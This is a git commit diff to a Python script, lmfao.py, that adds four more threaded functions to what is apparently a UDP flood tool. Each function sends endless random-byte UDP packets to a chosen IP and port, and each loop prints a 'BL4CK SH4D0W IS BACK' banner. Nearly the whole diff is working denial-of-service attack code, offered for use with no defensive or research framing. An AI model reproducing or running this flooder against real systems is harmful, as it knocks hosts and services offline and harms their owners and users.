4f4db2c622cc760b1b38e392505dfd4a3c7dd941
Lynzzx999 <103431068+Lynzzx999@users.noreply.github.com>
2022-06-26 12:55:16 +0700

    Update lmfao.py

--- lmfao.py
+++ lmfao.py
@@ -60,6 +60,54 @@ def run4():
 		except:
 			print("\033[1;31;40m | BL4CK SH4D0W IS BACK | ")
 
+def run5():
+	data = random._urandom(1050)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+				print("\033[1;31;40m | BL4CK SH4D0W IS BACK | ")
+		except:
+			print("\033[1;31;40m | BL4CK SH4D0W IS BACK | ")
+
+def run6():
+	data = random._urandom(1024)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+				print("\033[1;31;40m | BL4CK SH4D0W IS BACK | ")
+		except:
+			print("\033[1;31;40m | BL4CK SH4D0W IS BACK | ")
+
+def run7():
+	data = random._urandom(999)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+				print("\033[1;31;40m | BL4CK SH4D0W IS BACK | ")
+		except:
+			print("\033[1;31;40m | BL4CK SH4D0W IS BACK | ")
+
+def run8():
+	data = random._urandom(666)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+				print("\033[1;31;40m | BL4CK SH4D0W IS BACK | ")
+		except:
+			print("\033[1;31;40m | BL4CK SH4D0W IS BACK | ")
+
 # Multiple threads
 os.system('cls' if os.name=='nt' else 'clear')
 for x in range(threads):
@@ -71,6 +119,16 @@ for x in range(threads):
 	attack3.start()
 	attack4 = threading.Thread(target = run4)
 	attack4.start()
+
+for i in range(threads):
+	attack5 = threading.Thread(target = run5)
+	attack5.start()
+	attack6 = threading.Thread(target = run6)
+	attack6.start()
+	attack7 = threading.Thread(target = run7)
+	attack7.start()
+	attack8 = threading.Thread(target = run8)
+	attack8.start()
 
 if __name__ == '__main__':
     original_sigint = signal.getsignal(signal.SIGINT)
